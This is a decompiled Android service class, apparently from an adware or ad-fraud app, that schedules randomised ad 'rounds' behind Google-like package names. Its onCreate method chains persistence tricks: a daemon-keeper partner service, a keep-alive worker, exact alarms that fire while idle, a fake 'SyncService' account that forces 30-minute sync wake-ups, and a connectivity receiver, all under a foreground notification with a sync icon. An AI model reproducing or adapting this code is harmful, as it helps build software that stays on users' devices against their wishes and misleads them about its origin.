package com.speed.adv;

import a.a;
import a3.a0;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Bundle;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.SystemClock;
import android.util.Log;
import com.google.adtest.R;
import com.google.android.BakService;
import d0.l0;
import f1.d;
import f1.f;
import f1.g;
import h1.c0;
import j2.i;
import java.util.NoSuchElementException;
import l3.h;
import m1.b;
import m2.e;
import n2.c;
import t1.u;

/* JADX INFO: compiled from: r8-map-id-01bd2f78e356d1793fe12b6cab4b4ddc2ec9524fab1d39c14fcb56e383ba4015 */
/* JADX INFO: loaded from: classes.dex */
public final class AdService extends Service {

    /* JADX INFO: renamed from: l, reason: collision with root package name */
    public static final /* synthetic */ int f377l = 0;

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    public HandlerThread f378a;

    /* JADX INFO: renamed from: b, reason: collision with root package name */
    public g f379b;

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public long f380c;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public int f381d;

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public final Object f382e = new Object();

    /* JADX INFO: renamed from: f, reason: collision with root package name */
    public volatile boolean f383f;

    /* JADX INFO: renamed from: g, reason: collision with root package name */
    public volatile int f384g;

    /* JADX INFO: renamed from: h, reason: collision with root package name */
    public volatile boolean f385h;

    /* JADX INFO: renamed from: i, reason: collision with root package name */
    public volatile boolean f386i;

    /* JADX INFO: renamed from: j, reason: collision with root package name */
    public volatile boolean f387j;

    /* JADX INFO: renamed from: k, reason: collision with root package name */
    public volatile boolean f388k;

    public AdService() {
        new d();
    }

    public static boolean d() {
        c0.f1036a.getClass();
        a0 a0Var = c0.f1061z;
        c[] cVarArr = c0.f1037b;
        return (i.a((String) a0Var.a(cVarArr[19]), c0.b()) && i.a((String) c0.A.a(cVarArr[21]), c0.b())) ? false : true;
    }

    public final void a() {
        boolean z3;
        g gVar = this.f379b;
        if (gVar == null) {
            return;
        }
        synchronized (this.f382e) {
            z3 = this.f383f;
        }
        if (z3 || this.f388k || gVar.hasMessages(101)) {
            return;
        }
        c0.f1036a.getClass();
        long jG = c0.g() * ((long) 1000);
        a0 a0Var = c0.C;
        c[] cVarArr = c0.f1037b;
        long j4 = 0;
        if (((Number) a0Var.a(cVarArr[24])).longValue() < 0) {
            e eVar = new e(0L, a.F("persist.autorun.max_random_delay_ms", 6000000L));
            k2.a aVar = k2.d.f1291d;
            try {
                a0Var.e(cVarArr[24], Long.valueOf(a.x(eVar)));
            } catch (IllegalArgumentException e4) {
                throw new NoSuchElementException(e4.getMessage());
            }
        }
        long jLongValue = ((Number) a0Var.a(cVarArr[24])).longValue() + jG;
        long jLongValue2 = ((Number) c0.f1052q.a(cVarArr[10])).longValue();
        long jCurrentTimeMillis = System.currentTimeMillis();
        if (jLongValue2 > 0) {
            long j5 = (jLongValue2 + jLongValue) - jCurrentTimeMillis;
            if (j5 >= 0) {
                j4 = j5;
            }
        }
        h.a0("[AdServiceNoAd] 安排周期轮次: intervalMs=" + jLongValue + " delayMs=" + j4);
        this.f388k = true;
        gVar.sendEmptyMessageDelayed(101, j4);
    }

    public final void b(boolean z3) {
        if (d()) {
            e(z3 ? "startup_first_daily" : "startCommand_first_daily", z3);
        } else {
            a();
        }
        g gVar = this.f379b;
        if (gVar == null || gVar.hasMessages(103)) {
            return;
        }
        gVar.sendEmptyMessageDelayed(103, z3 ? 29000L : k2.d.f1291d.d(50000L, 90000L));
    }

    public final void c(String str, boolean z3) {
        int i4;
        boolean z4;
        boolean z5;
        boolean z6;
        boolean z7;
        synchronized (this.f382e) {
            try {
                if (this.f384g > 0) {
                    this.f384g--;
                }
                i4 = this.f384g;
                z4 = this.f385h;
                z5 = this.f386i;
                z6 = this.f387j;
                z7 = false;
                if (i4 <= 0) {
                    this.f384g = 0;
                    this.f383f = false;
                    z7 = true;
                }
            } catch (Throwable th) {
                throw th;
            }
        }
        h.a0("[AdServiceNoAd] finishRoundTask: task=" + str + " success=" + z3 + " remaining=" + i4);
        if (z7) {
            long jCurrentTimeMillis = System.currentTimeMillis();
            if (!z4 || (z5 && z6)) {
                c0.f1036a.getClass();
                c0.f1052q.e(c0.f1037b[10], Long.valueOf(jCurrentTimeMillis));
            }
            if (!z4 || (z5 && z6)) {
                a();
            } else {
                e("first_daily_retry", true);
            }
        }
    }

    public final void e(String str, boolean z3) {
        boolean z4;
        g gVar = this.f379b;
        if (gVar == null) {
            return;
        }
        synchronized (this.f382e) {
            z4 = this.f383f;
        }
        if (z4) {
            h.a0("[AdServiceNoAd] " + str + ": 当前轮次执行中，跳过安排");
            return;
        }
        if (z3) {
            gVar.removeMessages(101);
            this.f388k = false;
        } else if (this.f388k || gVar.hasMessages(101)) {
            return;
        }
        long jD = k2.d.f1291d.d(10000L, 300000L);
        long j4 = jD / ((long) 1000);
        if (j4 < 0) {
            j4 = 0;
        }
        long j5 = 60;
        h.a0("[AdServiceNoAd] " + str + ": 安排执行轮次，延迟=" + ((j4 / j5) + "分" + (j4 % j5) + "秒"));
        this.f388k = true;
        gVar.sendEmptyMessageDelayed(101, jD);
    }

    @Override // android.app.Service
    public final IBinder onBind(Intent intent) {
        h.a0("[AdServiceNoAd] onBind: 收到 Binder 查阅");
        return null;
    }

    @Override // android.app.Service
    public final void onCreate() {
        super.onCreate();
        b1.a.f336a.b(this);
        h.a0("[AdServiceNoAd] onCreate: AdService 已创建");
        try {
            Intent intent = new Intent(this, (Class<?>) BakService.class);
            try {
                if (Build.VERSION.SDK_INT >= 26) {
                    l0.J(this, intent);
                } else {
                    startService(intent);
                }
            } catch (Exception e4) {
                Log.e("DaemonKeeper", "Failed to start target service pre-bind: " + e4.getMessage());
            }
            bindService(intent, new b(this, intent, BakService.class), 1);
        } catch (Exception e5) {
            a1.c.f("[AdServiceNoAd] Failed to link BakService via DaemonKeeper: ", e5.getMessage());
        }
        try {
            a.D(this);
        } catch (Exception e6) {
            a1.c.f("[AdServiceNoAd] KeepAliveWorker schedule failed: ", e6.getMessage());
        }
        int i4 = 0;
        try {
            Object systemService = getSystemService("alarm");
            AlarmManager alarmManager = systemService instanceof AlarmManager ? (AlarmManager) systemService : null;
            if (alarmManager != null) {
                Intent intent2 = new Intent("com.speed.net.daemon.ALARM_KEEP_ALIVE").setPackage(getPackageName());
                i.d(intent2, "setPackage(...)");
                alarmManager.setExactAndAllowWhileIdle(2, SystemClock.elapsedRealtime() + 300000, PendingIntent.getBroadcast(this, 0, intent2, 201326592));
                Log.i("AlarmKeepAlive", "Alarm scheduled in 300s");
            }
        } catch (Exception e7) {
            a1.c.f("[AdServiceNoAd] AlarmKeepAlive schedule failed: ", e7.getMessage());
        }
        try {
            int i5 = m1.c.f1442a;
            AccountManager accountManager = AccountManager.get(this);
            String string = getString(R.string.lib_autorun_sync_account_type);
            i.d(string, "getString(...)");
            Account[] accountsByType = accountManager.getAccountsByType(string);
            i.d(accountsByType, "getAccountsByType(...)");
            if (accountsByType.length == 0) {
                accountManager.addAccountExplicitly(new Account("SyncService", string), null, null);
            }
            String string2 = getString(R.string.lib_autorun_sync_account_type);
            i.d(string2, "getString(...)");
            String string3 = getString(R.string.lib_autorun_sync_authority);
            i.d(string3, "getString(...)");
            Account account = new Account("SyncService", string2);
            ContentResolver.setIsSyncable(account, string3, 1);
            ContentResolver.setSyncAutomatically(account, string3, true);
            ContentResolver.addPeriodicSync(account, string3, Bundle.EMPTY, 1800L);
            h.a0("[AdServiceNoAd] AccountSync periodic sync scheduled (30 min)");
        } catch (Exception e8) {
            a1.c.f("[AdServiceNoAd] AccountSync setup failed: ", e8.getMessage());
        }
        try {
            registerReceiver(new f(i4), new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE"));
        } catch (Exception e9) {
            a1.c.f("[AdServiceNoAd] Dynamic CONNECTIVITY_CHANGE register failed: ", e9.getMessage());
        }
        HandlerThread handlerThread = new HandlerThread("AppUpdateThread");
        handlerThread.start();
        this.f378a = handlerThread;
        this.f379b = new g(this, handlerThread.getLooper());
        int i6 = u.f2173b;
        u.b();
        b(true);
    }

    @Override // android.app.Service
    public final void onDestroy() {
        super.onDestroy();
        h.a0("[AdServiceNoAd] onDestroy: 停止前台与消息循环");
        g gVar = this.f379b;
        if (gVar != null) {
            gVar.removeCallbacksAndMessages(null);
        }
        HandlerThread handlerThread = this.f378a;
        if (handlerThread != null) {
            handlerThread.quitSafely();
        }
        stopForeground(true);
    }

    @Override // android.app.Service
    public final int onStartCommand(Intent intent, int i4, int i5) {
        h.a0("[AdServiceNoAd] onStartCommand: startId=" + i5 + " flags=" + i4);
        if (Build.VERSION.SDK_INT >= 26) {
            Object systemService = getSystemService("notification");
            i.c(systemService, "null cannot be cast to non-null type android.app.NotificationManager");
            f1.b.c();
            ((NotificationManager) systemService).createNotificationChannel(f1.b.b(getString(R.string.lib_autorun_runtime_notification_channel)));
        }
        Intent launchIntentForPackage = getPackageManager().getLaunchIntentForPackage(getPackageName());
        if (launchIntentForPackage == null) {
            launchIntentForPackage = new Intent();
        }
        PendingIntent activity = PendingIntent.getActivity(this, 0, launchIntentForPackage, 201326592);
        h.c cVar = new h.c(this, "AdServiceChannel");
        cVar.f994l.icon = android.R.drawable.stat_notify_sync_noanim;
        cVar.f987e = h.c.b(getString(R.string.lib_autorun_runtime_notification_title));
        cVar.f988f = h.c.b(getString(R.string.lib_autorun_runtime_notification_text));
        cVar.f989g = activity;
        cVar.f994l.flags |= 2;
        Notification notificationA = cVar.a();
        i.d(notificationA, "build(...)");
        startForeground(1001, notificationA);
        long jElapsedRealtime = SystemClock.elapsedRealtime();
        if (jElapsedRealtime - this.f380c < 60000) {
            h.a0("[AdServiceNoAd] onStartCommand: Skipped due to 60s throttle limit.");
            return 1;
        }
        this.f380c = jElapsedRealtime;
        b(false);
        return 1;
    }
}
